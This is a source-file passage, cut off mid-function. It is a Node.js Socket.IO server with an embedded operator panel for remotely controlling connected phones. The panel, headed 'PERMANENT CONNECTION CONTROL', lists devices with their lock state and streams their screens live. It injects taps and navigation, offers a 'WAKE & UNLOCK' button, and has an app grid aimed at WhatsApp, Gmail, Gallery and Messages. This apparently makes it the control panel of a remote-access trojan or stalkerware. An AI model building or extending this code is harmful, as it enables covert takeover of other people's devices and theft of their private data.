const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    transports: ['websocket', 'polling']
});

app.use(express.json());

// Store connected devices and admins
const devices = new Map();
const admins = new Map();

// HTML PANEL - एक ही फाइल में सब कुछ
const HTML_PANEL = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Screen Control - AI Enhanced Live View</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body { 
            font-family: 'Roboto', sans-serif; 
            background-color: #121212; 
            color: #e0e0e0; 
            height: 100vh; 
            width: 100vw;
            overflow: hidden;
        }
        
        /* VIEWS */
        .view { 
            display: none; 
            width: 100%; 
            height: 100%; 
            position: absolute;
            top: 0;
            left: 0;
        }
        
        .view.active { 
            display: flex; 
            flex-direction: column; 
        }
        
        /* DEVICE LIST VIEW */
        #device-list-view { 
            flex-direction: column; 
            background: #121212;
        }
        
        .header { 
            background-color: #1e1e1e; 
            padding: 15px 20px; 
            text-align: center; 
            border-bottom: 3px solid #00ff00; 
            flex-shrink: 0; 
        }
        
        .header h1 { 
            font-family: 'Orbitron', sans-serif; 
            margin: 0; 
            font-size: 1.8em; 
            color: #00ff00; 
            text-shadow: 0 0 10px #00ff00; 
        }
        
        #device-list-container { 
            padding: 20px; 
            overflow-y: auto; 
            flex-grow: 1; 
        }
        
        #device-list { 
            list-style: none; 
            padding: 0; 
            margin: 0; 
            display: grid; 
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); 
            gap: 15px; 
        }
        
        .device { 
            background-color: #1e1e1e; 
            border-radius: 12px; 
            border-left: 6px solid #555; 
            padding: 20px; 
            cursor: pointer; 
            transition: all 0.3s ease; 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
            border: 1px solid #333;
        }
        
        .device:hover { 
            transform: translateY(-3px); 
            box-shadow: 0 10px 25px rgba(0,255,0,0.2); 
            border-left-color: #00ff00; 
            border-color: #00ff00;
        }
        
        .device-name { 
            font-size: 1.4em; 
            font-weight: 700; 
            margin-bottom: 5px;
        }
        
        .device-info { 
            font-size: 0.95em; 
            color: #aaa; 
        }
        
        .status-dot { 
            height: 16px; 
            width: 16px; 
            background-color: #28a745; 
            border-radius: 50%; 
            display: inline-block; 
            box-shadow: 0 0 10px #28a745; 
        }
        
        .lock-badge { 
            background: #ff4444; 
            color: white; 
            padding: 3px 10px; 
            border-radius: 12px; 
            font-size: 0.85em; 
            margin-left: 10px; 
            font-weight: bold;
        }
        
        .lock-badge.unlocked { 
            background: #44ff44; 
            color: #000;
        }
        
        /* CONTROL VIEW - FULL SCREEN */
        #control-view { 
            flex-direction: column; 
            background: #000;
        }
        
        .control-header { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            padding: 12px 20px; 
            background-color: #1a1a1a; 
            border-bottom: 2px solid #333; 
            flex-wrap: wrap; 
            gap: 12px; 
            flex-shrink: 0; 
            z-index: 100;
        }
        
        #back-to-list-btn { 
            background-color: #3f3f46; 
            color: white; 
            border: 1px solid #555; 
            padding: 10px 18px; 
            border-radius: 6px; 
            cursor: pointer; 
            font-size: 1em; 
            font-weight: bold;
            transition: all 0.2s;
        }
        
        #back-to-list-btn:hover {
            background-color: #555;
        }
        
        #device-title { 
            font-size: 1.3em; 
            font-weight: bold; 
            color: #00ff00;
            text-shadow: 0 0 5px #00ff00;
        }
        
        .lock-info { 
            background: #2a2a2a; 
            padding: 6px 12px; 
            border-radius: 6px; 
            font-size: 0.95em; 
            border: 1px solid #444;
        }
        
        .mode-toggle-buttons { 
            display: flex; 
            gap: 10px; 
        }
        
        .mode-toggle-btn { 
            background: #3f3f46; 
            color: white; 
            border: 1px solid #555; 
            padding: 10px 18px; 
            border-radius: 6px; 
            cursor: pointer; 
            font-size: 0.95em; 
            font-weight: bold;
            transition: all 0.3s; 
        }
        
        .mode-toggle-btn:hover { 
            background: #555; 
        }
        
        .mode-toggle-btn.active { 
            background: #00ff00; 
            color: #000; 
            border-color: #00ff00; 
            box-shadow: 0 0 10px #00ff00;
        }
        
        .ai-toggle-btn { 
            background: #9C27B0; 
            color: white; 
            border: 1px solid #BA68C8; 
            padding: 10px 18px; 
            border-radius: 6px; 
            cursor: pointer; 
            font-size: 0.95em; 
            font-weight: bold;
            transition: all 0.3s; 
        }
        
        .ai-toggle-btn:hover { 
            background: #BA68C8; 
        }
        
        .ai-toggle-btn.active { 
            background: #00E676; 
            color: #000; 
            border-color: #00E676; 
            box-shadow: 0 0 10px #00E676;
        }
        
        /* FULL SCREEN CONTAINER */
        .main-container { 
            display: flex; 
            flex-grow: 1; 
            min-height: 0; 
            overflow: hidden;
            background: #000;
            position: relative;
        }
        
        /* SCREEN AREA - FULL SCREEN */
        .screen-area { 
            flex-grow: 1; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 0;
            position: relative; 
            overflow: hidden;
            background: #000;
            width: 100%;
            height: 100%;
        }
        
        .screen-viewport { 
            border: none;
            background-color: #000; 
            overflow: hidden; 
            position: relative; 
            width: 100%;
            height: 100%;
            display: flex; 
            align-items: center; 
            justify-content: center;
        }
        
        /* FULL SCREEN IMAGE - COLORFUL */
        .live-screen-image { 
            width: 100%;
            height: 100%;
            object-fit: contain;
            background-color: #000; 
            cursor: crosshair;
            image-rendering: crisp-edges;
            filter: brightness(1.05) contrast(1.05) saturate(1.1);
        }
        
        /* IMAGE CONTAINER FOR BETTER CLICK HANDLING */
        .image-container {
            position: relative;
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #000;
        }
        
        /* AI ELEMENT HIGHLIGHTS */
        .ai-highlight-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 5;
        }
        
        .ai-element {
            position: absolute;
            border: 2px solid;
            background: rgba(0, 255, 0, 0.1);
            border-radius: 8px;
            cursor: pointer;
            pointer-events: auto;
            transition: all 0.3s;
            z-index: 6;
            overflow: hidden;
        }
        
        .ai-element:hover {
            background: rgba(0, 255, 255, 0.2);
            border-color: cyan !important;
            box-shadow: 0 0 15px cyan;
            transform: scale(1.02);
        }
        
        .ai-element-label {
            position: absolute;
            bottom: -25px;
            left: 0;
            background: rgba(0, 0, 0, 0.9);
            color: #fff;
            padding: 3px 8px;
            border-radius: 6px;
            font-size: 12px;
            white-space: nowrap;
            display: flex;
            align-items: center;
            gap: 6px;
            font-weight: bold;
            border: 1px solid;
            box-shadow: 0 2px 10px rgba(0,0,0,0.5);
            min-width: 60px;
        }
        
        .ai-element-icon {
            width: 18px;
            height: 18px;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 11px;
            font-weight: bold;
            color: white;
        }
        
        /* CLICK OVERLAY FOR DEBUGGING */
        .click-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 10;
        }
        
        .click-marker {
            position: absolute;
            width: 24px;
            height: 24px;
            background: rgba(255, 0, 0, 0.7);
            border: 3px solid #fff;
            border-radius: 50%;
            transform: translate(-50%, -50%);
            pointer-events: none;
            z-index: 100;
            display: none;
            box-shadow: 0 0 15px rgba(255,0,0,0.8);
            animation: pulse-click 0.5s ease-out;
        }
        
        @keyframes pulse-click {
            0% { transform: translate(-50%, -50%) scale(0.5); opacity: 0.5; }
            70% { transform: translate(-50%, -50%) scale(1.2); opacity: 1; }
            100% { transform: translate(-50%, -50%) scale(1); opacity: 0.7; }
        }
        
        /* CONTROLS */
        .all-controls { 
            width: 90px; 
            background-color: rgba(30, 30, 30, 0.95); 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: flex-start; 
            gap: 15px; 
            padding: 25px 12px; 
            flex-shrink: 0; 
            overflow-y: auto;
            border-left: 2px solid #333;
            z-index: 50;
        }
        
        .control-button { 
            width: 65px; 
            height: 65px; 
            background-color: #3f3f46; 
            border: 2px solid #555; 
            color: white; 
            border-radius: 50%; 
            cursor: pointer; 
            font-size: 28px; 
            transition: all 0.2s; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            flex-shrink: 0;
            font-weight: bold;
        }
        
        .control-button:hover { 
            background-color: #555; 
            transform: scale(1.05);
            border-color: #00ff00;
        }
        
        .divider { 
            height: 2px; 
            width: 80%; 
            background-color: #444; 
            margin: 15px 0; 
        }
        
        /* STATUS INDICATORS */
        .status-indicator { 
            display: flex; 
            align-items: center; 
            gap: 8px; 
            font-size: 0.95em; 
            flex-shrink: 0; 
        }
        
        .live-indicator { 
            width: 12px; 
            height: 12px; 
            background-color: #ff4444; 
            border-radius: 50%; 
            animation: pulse 1.5s infinite; 
        }
        
        .live-indicator.active { 
            background-color: #44ff44; 
            box-shadow: 0 0 10px #44ff44;
        }
        
        @keyframes pulse { 
            0% { opacity: 1; } 
            50% { opacity: 0.5; } 
            100% { opacity: 1; } 
        }
        
        .connection-status { 
            display: flex; 
            align-items: center; 
            gap: 8px; 
            font-size: 0.95em; 
            padding: 8px 12px; 
            border-radius: 6px; 
            background: #2a2a2a; 
            border: 1px solid #444;
        }
        
        .connection-dot { 
            width: 10px; 
            height: 10px; 
            border-radius: 50%; 
        }
        
        .connection-dot.connected { 
            background-color: #44ff44; 
            box-shadow: 0 0 10px #44ff44; 
        }
        
        .connection-dot.disconnected { 
            background-color: #ff4444; 
            box-shadow: 0 0 10px #ff4444; 
        }
        
        .connection-stats { 
            font-size: 0.85em; 
            color: #aaa; 
            margin-top: 3px; 
        }
        
        /* MAIN BUTTON */
        .single-main-btn { 
            background: linear-gradient(135deg, #0066cc, #0099ff); 
            color: white; 
            border: none; 
            padding: 12px 25px; 
            border-radius: 8px; 
            font-size: 1.1em; 
            font-weight: bold; 
            cursor: pointer; 
            box-shadow: 0 5px 15px rgba(0, 102, 204, 0.4); 
            transition: all 0.3s; 
            display: flex; 
            align-items: center; 
            gap: 8px; 
            flex-shrink: 0; 
        }
        
        .single-main-btn:hover { 
            background: linear-gradient(135deg, #0099ff, #00ccff); 
            transform: translateY(-2px); 
            box-shadow: 0 8px 20px rgba(0, 153, 255, 0.6); 
        }
        
        /* DEBUG INFO */
        .debug-info {
            position: absolute;
            bottom: 10px;
            left: 10px;
            background: rgba(0,0,0,0.85);
            color: #0f0;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 12px;
            z-index: 1000;
            border: 1px solid #0f0;
            box-shadow: 0 0 15px rgba(0,255,0,0.3);
            max-width: 300px;
            backdrop-filter: blur(5px);
            display: none;
        }
        
        .coords-display {
            position: absolute;
            top: 10px;
            right: 10px;
            background: rgba(0,0,0,0.85);
            color: #0f0;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 12px;
            z-index: 1000;
            border: 1px solid #0f0;
            box-shadow: 0 0 15px rgba(0,255,0,0.3);
            display: none;
            backdrop-filter: blur(5px);
        }
        
        /* AI DETECTION STATS */
        .ai-stats {
            position: absolute;
            bottom: 10px;
            right: 10px;
            background: rgba(0,0,0,0.85);
            color: #ff00ff;
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 11px;
            z-index: 1000;
            border: 1px solid #ff00ff;
            box-shadow: 0 0 15px rgba(255,0,255,0.3);
            display: none;
            backdrop-filter: blur(5px);
        }
        
        /* APP ICON GRID */
        .app-grid {
            position: absolute;
            top: 60px;
            right: 100px;
            background: rgba(30, 30, 30, 0.98);
            border: 2px solid #00ff00;
            border-radius: 12px;
            padding: 15px;
            display: none;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            z-index: 1000;
            width: 280px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
            backdrop-filter: blur(10px);
        }
        
        .app-grid-header {
            grid-column: 1 / -1;
            text-align: center;
            margin-bottom: 10px;
            color: #00ff00;
            font-weight: bold;
            font-size: 14px;
        }
        
        .app-icon {
            width: 55px;
            height: 55px;
            border-radius: 12px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 24px;
            font-weight: bold;
        }
        
        .app-icon:hover {
            transform: scale(1.1);
            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
        }
        
        .app-icon-label {
            font-size: 9px;
            margin-top: 3px;
            color: white;
            text-align: center;
            max-width: 50px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        
        /* LOADING SPINNER */
        .loading-spinner {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 50px;
            height: 50px;
            border: 5px solid #333;
            border-top: 5px solid #00ff00;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            z-index: 1000;
            display: none;
        }
        
        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
    </style>
</head>
<body>

    <div id="device-list-view" class="view active">
        <div class="header"><h1>🔓 PERMANENT CONNECTION CONTROL</h1></div>
        <div id="device-list-container"><ul id="device-list"></ul></div>
    </div>

    <div id="control-view" class="view">
        <div class="control-header">
            <button id="back-to-list-btn">← Back to List</button>
            <h2 id="device-title"></h2>
            <div class="lock-info" id="lock-status">Lock: Unknown</div>
            <div class="mode-toggle-buttons">
                <button id="btn-live-screen" class="mode-toggle-btn active">📱 LIVE SCREEN</button>
                <button id="btn-ai-mode" class="ai-toggle-btn active">🤖 AI DETECTION ON</button>
                <button id="btn-app-grid" class="mode-toggle-btn" style="background: #FF9800;">📱 APP GRID</button>
                <button id="btn-calibrate" class="mode-toggle-btn" style="background: #9C27B0;">🎯 CALIBRATE</button>
            </div>
            <div class="status-indicator">
                <div id="live-indicator" class="live-indicator"></div>
                <span id="stream-status">Stream: Off</span>
            </div>
            <div class="connection-status">
                <div id="connection-dot" class="connection-dot disconnected"></div>
                <span id="connection-status-text">Connecting...</span>
                <div class="connection-stats" id="connection-stats"></div>
            </div>
            <button id="btn-wake-unlock" class="single-main-btn">⚡ WAKE & UNLOCK</button>
        </div>
        <div class="main-container">
            <div class="screen-area">
                <div id="live-screen-viewport" class="screen-viewport" style="display: block;">
                    <div class="image-container">
                        <img id="live-screen-image" class="live-screen-image" src="" alt="Live Screen" />
                        <div class="ai-highlight-overlay" id="ai-highlight-overlay"></div>
                        <div class="click-overlay">
                            <div id="click-marker" class="click-marker"></div>
                        </div>
                        <div id="coords-display" class="coords-display">Click: x=0, y=0</div>
                        <div id="debug-info" class="debug-info">Debug Info</div>
                        <div id="ai-stats" class="ai-stats">AI: 0 elements detected</div>
                        <div id="app-grid" class="app-grid"></div>
                        <div id="loading-spinner" class="loading-spinner"></div>
                    </div>
                </div>
            </div>
            <div class="all-controls">
                <button class="control-button" id="btn-scroll-up">↑</button>
                <div style="display: flex; gap: 5px;">
                    <button class="control-button" id="btn-scroll-left">←</button>
                    <button class="control-button" id="btn-scroll-right">→</button>
                </div>
                <button class="control-button" id="btn-scroll-down">↓</button>
                <div class="divider"></div>
                <button class="control-button" id="btn-back">⮌</button>
                <button class="control-button" id="btn-home">⌂</button>
                <button class="control-button" id="btn-recents">□</button>
                <div class="divider"></div>
                <button class="control-button" id="btn-start-stream">▶️</button>
                <button class="control-button" id="btn-stop-stream">⏸️</button>
                <button class="control-button" id="btn-refresh-ai" style="background: #9C27B0;">🔍 AI</button>
            </div>
        </div>
    </div>

    <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
    <script>
        // ENHANCED SOCKET CONNECTION
        const socket = io({
            reconnection: true,
            reconnectionAttempts: Infinity,
            reconnectionDelay: 1000,
            reconnectionDelayMax: 10000,
            randomizationFactor: 0.3,
            timeout: 20000,
            transports: ['websocket', 'polling'],
            autoConnect: true,
            forceNew: false,
            multiplex: false
        });

        const UIElements = {
            deviceListView: document.getElementById('device-list-view'),
            controlView: document.getElementById('control-view'),
            deviceList: document.getElementById('device-list'),
            deviceTitle: document.getElementById('device-title'),
            lockStatus: document.getElementById('lock-status'),
            backToListBtn: document.getElementById('back-to-list-btn'),
            liveScreenBtn: document.getElementById('btn-live-screen'),
            aiModeBtn: document.getElementById('btn-ai-mode'),
            appGridBtn: document.getElementById('btn-app-grid'),
            calibrateBtn: document.getElementById('btn-calibrate'),
            liveScreenViewport: document.getElementById('live-screen-viewport'),
            liveScreenImage: document.getElementById('live-screen-image'),
            aiHighlightOverlay: document.getElementById('ai-highlight-overlay'),
            connectionDot: document.getElementById('connection-dot'),
            connectionStatusText: document.getElementById('connection-status-text'),
            connectionStats: document.getElementById('connection-stats'),
            liveIndicator: document.getElementById('live-indicator'),
            streamStatus: document.getElementById('stream-status'),
            clickMarker: document.getElementById('click-marker'),
            coordsDisplay: document.getElementById('coords-display'),
            debugInfo: document.getElementById('debug-info'),
            aiStats: document.getElementById('ai-stats'),
            appGrid: document.getElementById('app-grid'),
            loadingSpinner: document.getElementById('loading-spinner'),
            refreshAIBtn: document.getElementById('btn-refresh-ai')
        };

        // STATE MANAGEMENT
        let state = {
            devices: {},
            activeDeviceId: null,
            connectionStartTime: 0,
            isLiveStreaming: false,
            currentScreenView: 'live',
            lastPingTime: Date.now(),
            connectionAttempts: 0,
            deviceConnectionState: new Map(),
            retryTimeout: null,
            screenDimensions: { width: 0, height: 0 },
            clickHistory: [],
            debugMode: false,
            aiDetectionMode: true,
            colorEnhancement: true,
            currentImageData: null,
            calibrationOffset: { x: 0, y: 0 },
            scaleFactor: 1.0,
            detectedElements: [],
            appIcons: [],
            aiClickMode: false,
            elementClickQueue: [],
            clickDelay: 300,
            currentScale: { x: 1, y: 1 },
            currentOffset: { x: 0, y: 0 }
        };

        // APP COLOR DATABASE
        const appColorDatabase = {
            // Apps
            'app_whatsapp': { 
                bgColor: 'linear-gradient(135deg, #25D366, #128C7E)', 
                text: 'WA', 
                emoji: '💬',
                name: 'WhatsApp',
                borderColor: '#25D366'
            },
            'app_facebook': { 
                bgColor: 'linear-gradient(135deg, #1877F2, #0D5CB6)', 
                text: 'FB', 
                emoji: '👥',
                name: 'Facebook',
                borderColor: '#1877F2'
            },
            'app_instagram': { 
                bgColor: 'linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888)', 
                text: 'IG', 
                emoji: '📸',
                name: 'Instagram',
                borderColor: '#E1306C'
            },
            'app_youtube': { 
                bgColor: 'linear-gradient(135deg, #FF0000, #CC0000)', 
                text: 'YT', 
                emoji: '🎬',
                name: 'YouTube',
                borderColor: '#FF0000'
            },
            'app_chrome': { 
                bgColor: 'linear-gradient(135deg, #4285F4, #0F9D58, #F4B400, #DB4437)', 
                text: 'GC', 
                emoji: '🌐',
                name: 'Chrome',
                borderColor: '#4285F4'
            },
            'app_gmail': { 
                bgColor: 'linear-gradient(135deg, #EA4335, #D14836)', 
                text: 'GM', 
                emoji: '📧',
                name: 'Gmail',
                borderColor: '#EA4335'
            },
            'app_file_manager': { 
                bgColor: 'linear-gradient(135deg, #009688, #00796B)', 
                text: 'FM', 
                emoji: '📁',
                name: 'File Manager',
                borderColor: '#009688'
            },
            'app_gallery': { 
                bgColor: 'linear-gradient(135deg, #795548, #5D4037)', 
                text: 'GL', 
                emoji: '🖼️',
                name: 'Gallery',
                borderColor: '#795548'
            },
            'app_camera': { 
                bgColor: 'linear-gradient(135deg, #795548, #5D4037)', 
                text: 'CM', 
                emoji: '📷',
                name: 'Camera',
                borderColor: '#795548'
            },
            'app_settings': { 
                bgColor: 'linear-gradient(135deg, #607D8B, #455A64)', 
                text: 'ST', 
                emoji: '⚙️',
                name: 'Settings',
                borderColor: '#607D8B'
            },
            'app_phone': { 
                bgColor: 'linear-gradient(135deg, #4CAF50, #388E3C)', 
                text: 'PH', 
                emoji: '📞',
                name: 'Phone',
                borderColor: '#4CAF50'
            },
            'app_messages': { 
                bgColor: 'linear-gradient(135deg, #03A9F4, #0288D1)', 
                text: 'MSG', 
                emoji: '💬',
                name: 'Messages',
                borderColor: '#03A9F4'
            },
            'app_calculator': { 
                bgColor: 'linear-gradient(135deg, #FF9800, #F57C00)', 
                text: 'CAL', 
                emoji: '📱',
                name: 'Calculator',
                borderColor: '#FF9800'
            },
            'app_clock': { 
                bgColor: 'linear-gradient(135deg, #9C27B0, #7B1FA2)', 
                text: 'CLK', 
                emoji: '⏰',
                name: 'Clock',
                borderColor: '#9C27B0'
            },
            'app_calendar': { 
                bgColor: 'linear-gradient(135deg, #E91E63, #C2185B)', 
                text: 'CAL', 
                emoji: '📅',
                name: 'Calendar',
                borderColor: '#E91E63'
            },
            
            // Folders
            'folder_download': { 
                bgColor: 'linear-gradient(135deg, #FFC107, #FFA000)', 
                text: 'DL', 
                emoji: '📥',
                name: 'Downloads',
                borderColor: '#FFC107'
            },
            'folder_document': { 
                bgColor: 'linear-gradient(135deg, #9E9E9E, #757575)', 
                text: 'DOC', 
                emoji: '📄',
                name: 'Documents',
                borderColor: '#9E9E9E'
            },
            'folder_image': { 
                bgColor: 'linear-gradient(135deg, #2196F3, #1976D2)', 
                text: 'IMG', 
                emoji: '🖼️',
                name: 'Pictures',
                borderColor: '#2196F3'
            },
            'folder_video': { 
                bgColor: 'linear-gradient(135deg, #4CAF50, #388E3C)', 
                text: 'VID', 
                emoji: '🎬',
                name: 'Videos',
                borderColor: '#4CAF50'
            },
            'folder_music': { 
                bgColor: 'linear-gradient(135deg, #9C27B0, #7B1FA2)', 
                text: 'MUS', 
                emoji: '🎵',
                name: 'Music',
                borderColor: '#9C27B0'
            },
            
            // UI Elements
            'ui_button': { 
                bgColor: 'linear-gradient(135deg, #4285F4, #3367D6)', 
                text: 'BTN', 
                emoji: '🔘',
                name: 'Button',
                borderColor: '#4285F4'
            },
            'ui_back': { 
                bgColor: 'transparent', 
                text: '←', 
                emoji: '←',
                name: 'Back',
                borderColor: '#000'
            },
            'ui_home': { 
                bgColor: 'transparent', 
                text: '⌂', 
                emoji: '⌂',
                name: 'Home',
                borderColor: '#000'
            },
            'ui_menu': { 
                bgColor: 'transparent', 
                text: '☰', 
                emoji: '☰',
                name: 'Menu',
                borderColor: '#000'
            },
            'ui_search': { 
                bgColor: 'linear-gradient(135deg, #F5F5F5, #E0E0E0)', 
                text: '🔍', 
                emoji: '🔍',
                name: 'Search',
                borderColor: '#CCCCCC'
            },
            'ui_share': { 
                bgColor: 'linear-gradient(135deg, #FFC107, #FFA000)', 
                text: '📤', 
                emoji: '📤',
                name: 'Share',
                borderColor: '#FFC107'
            },
            'ui_delete': { 
                bgColor: 'linear-gradient(135deg, #F44336, #D32F2F)', 
                text: '🗑️', 
                emoji: '🗑️',
                name: 'Delete',
                borderColor: '#F44336'
            },
            'ui_edit': { 
                bgColor: 'linear-gradient(135deg, #2196F3, #1976D2)', 
                text: '✏️', 
                emoji: '✏️',
                name: 'Edit',
                borderColor: '#2196F3'
            },
            'ui_save': { 
                bgColor: 'linear-gradient(135deg, #4CAF50, #388E3C)', 
                text: '💾', 
                emoji: '💾',
                name: 'Save',
                borderColor: '#4CAF50'
            },
            'ui_send': { 
                bgColor: 'linear-gradient(135deg, #9C27B0, #7B1FA2)', 
                text: '📨', 
                emoji: '📨',
                name: 'Send',
                borderColor: '#9C27B0'
            },
            'ui_add': { 
                bgColor: 'linear-gradient(135deg, #009688, #00796B)', 
                text: '➕', 
                emoji: '➕',
                name: 'Add',
                borderColor: '#009688'
            },
            
            // Generic Elements
            'button': { 
                bgColor: 'linear-gradient(135deg, #4285F4, #3367D6)', 
                text: 'BTN', 
                emoji: '🔘',
                name: 'Button',
                borderColor: '#4285F4'
            },
            'input': { 
                bgColor: 'linear-gradient(135deg, #FFFFFF, #F5F5F5)', 
                text: 'INP', 
                emoji: '📝',
                name: 'Input Field',
                borderColor: '#CCCCCC'
            },
            'checkbox': { 
                bgColor: 'linear-gradient(135deg, #FFFFFF, #E0E0E0)', 
                text: '☐', 
                emoji: '☐',
                name: 'Checkbox',
                borderColor: '#CCCCCC'
            },
            'checkbox_checked': { 
                bgColor: 'linear-gradient(135deg, #4CAF50, #388E3C)', 
                text: '✓', 
                emoji: '✓',
                name: 'Checked',
                borderColor: '#4CAF50'
            },
            'scrollable': { 
                bgColor: 'linear-gradient(135deg, rgba(100,100,100,0.3), rgba(100,100,100,0.1))', 
                text: 'SCR', 
                emoji: '↕️',
                name: 'Scrollable',
                borderColor: '#666666'
            },
            'icon': { 
                bgColor: 'linear-gradient(135deg, #666, #444)', 
                text: 'ICO', 
                emoji: '📱',
                name: 'Icon',
                borderColor: '#666666'
            },
            'text': { 
                bgColor: 'linear-gradient(135deg, rgba(224,224,224,0.3), rgba(224,224,224,0.1))', 
                text: 'TXT', 
                emoji: '📄',
                name: 'Text',
                borderColor: '#E0E0E0'
            }
        };

        // ENHANCED CLICK HANDLER WITH CALIBRATION AND AI
        function setupClickHandler() {
            UIElements.liveScreenImage.addEventListener('click', handleScreenClick);
            UIElements.liveScreenImage.addEventListener('contextmenu', handleRightClick);
            
            console.log('🎯 Click handler setup with calibration');
        }

        function handleScreenClick(e) {
            if (!state.isLiveStreaming || !state.activeDeviceId) {
                console.warn('Cannot click: No active stream or device');
                return;
            }

            // Check if clicking on AI element
            const aiElements = document.querySelectorAll('.ai-element');
            let clickedOnAIElement = false;
            
            for (const element of aiElements) {
                const rect = element.getBoundingClientRect();
                if (e.clientX >= rect.left && e.clientX <= rect.right &&
                    e.clientY >= rect.top && e.clientY <= rect.bottom) {
                    
                    const elementData = element.dataset;
                    if (elementData.x && elementData.y && elementData.width && elementData.height) {
                        // Click in the center of the AI element
                        const centerX = parseInt(elementData.x) + parseInt(elementData.width) / 2;
                        const centerY = parseInt(elementData.y) + parseInt(elementData.height) / 2;
                        
                        sendClickCommand(centerX, centerY, `ai-${elementData.type || 'element'}`);
                        
                        clickedOnAIElement = true;
                        break;
                    }
                }
            }
            
            if (clickedOnAIElement) return;

            const rect = e.target.getBoundingClientRect();
            const imageElement = e.target;
            
            // Get actual displayed image dimensions
            const containerWidth = rect.width;
            const containerHeight = rect.height;
            
            if (!imageElement.naturalWidth || !imageElement.naturalHeight) {
                console.warn('Image not loaded yet');
                return;
            }
            
            const imageAspectRatio = imageElement.naturalWidth / imageElement.naturalHeight;
            const containerAspectRatio = containerWidth / containerHeight;
            
            let imageWidth, imageHeight, offsetX = 0, offsetY = 0;
            
            if (containerAspectRatio > imageAspectRatio) {
                // Image is height-constrained
                imageHeight = containerHeight;
                imageWidth = imageHeight * imageAspectRatio;
                offsetX = (containerWidth - imageWidth) / 2;
            } else {
                // Image is width-constrained
                imageWidth = containerWidth;
                imageHeight = imageWidth / imageAspectRatio;
                offsetY = (containerHeight - imageHeight) / 2;
            }
            
            // Calculate click position relative to actual image
            const clickX = e.clientX - rect.left - offsetX;
            const clickY = e.clientY - rect.top - offsetY;
            
            // Check if click is within image bounds
            if (clickX < 0 || clickY < 0 || clickX > imageWidth || clickY > imageHeight) {
                console.warn('Click outside image area');
                return;
            }
            
            // Scale to original image coordinates
            const scaleX = imageElement.naturalWidth / imageWidth;
            const scaleY = imageElement.naturalHeight / imageHeight;
            
            // Apply calibration offset
            const calibratedX = Math.round((clickX * scaleX) + state.calibrationOffset.x);
            const calibratedY = Math.round((clickY * scaleY) + state.calibrationOffset.y);
            
            // Clamp to screen bounds
            const finalX = Math.max(0, Math.min(calibratedX, imageElement.naturalWidth - 1));
            const finalY = Math.max(0, Math.min(calibratedY, imageElement.naturalHeight - 1));
            
            // Store scale and offset for AI elements
            state.currentScale = { x: scaleX, y: scaleY };
            state.currentOffset = { x: offsetX, y: offsetY };
            
            // Show visual feedback
            showClickFeedback(clickX + offsetX, clickY + offsetY, finalX, finalY);
            
            // Send click command
            sendClickCommand(finalX, finalY, 'screen-click');
            
            // Update debug info
            if (state.debugMode) {
                UIElements.debugInfo.innerHTML = \`
                    🔍 Click Details:<br>
                    Screen: \${finalX}, \${finalY}<br>
                    Container: \${Math.round(clickX + offsetX)}, \${Math.round(clickY + offsetY)}<br>
                    Calibration: \${state.calibrationOffset.x}, \${state.calibrationOffset.y}<br>
                    Scale: \${scaleX.toFixed(2)}, \${scaleY.toFixed(2)}
                \`;
                UIElements.debugInfo.style.display = 'block';
            }
        }

        function handleRightClick(e) {
            e.preventDefault();
            if (!state.isLiveStreaming) return;
            
            const rect = e.target.getBoundingClientRect();
            const clickX = e.clientX - rect.left;
            const clickY = e.clientY - rect.top;
            
            // Toggle calibration adjustment
            state.calibrationOffset.x += e.shiftKey ? -10 : 10;
            state.calibrationOffset.y += e.ctrlKey ? -10 : 10;
            
            UIElements.debugInfo.innerHTML = \`
                🔧 Calibration Adjusted<br>
                Offset: \${state.calibrationOffset.x}, \${state.calibrationOffset.y}<br>
                Click at: \${Math.round(clickX)}, \${Math.round(clickY)}<br>
                <small>Shift/Ctrl for negative adjustment</small>
            \`;
            UIElements.debugInfo.style.display = 'block';
            
            setTimeout(() => {
                UIElements.debugInfo.style.display = 'none';
            }, 3000);
            
            console.log(\`🔧 Calibration offset: \${state.calibrationOffset.x}, \${state.calibrationOffset.y}\`);
        }

        function sendClickCommand(x, y, type = 'touch') {
            console.log(\`🎯 Sending \${type}: x=\${x}, y=\${y}\`);
            
            sendCommand('touch_command', { 
                x: x, 
                y: y,
                type: type,
                timestamp: Date.now(),
                calibration: state.calibrationOffset,
                ai_detected: type.includes('ai-')
            });
            
            // Store in history
            state.clickHistory.push({
                x: x,
                y: y,
                type: type,
                timestamp: Date.now(),
                success: null
            });
            
            // Keep only recent history
            if (state.clickHistory.length > 20) {
                state.clickHistory.shift();
            }
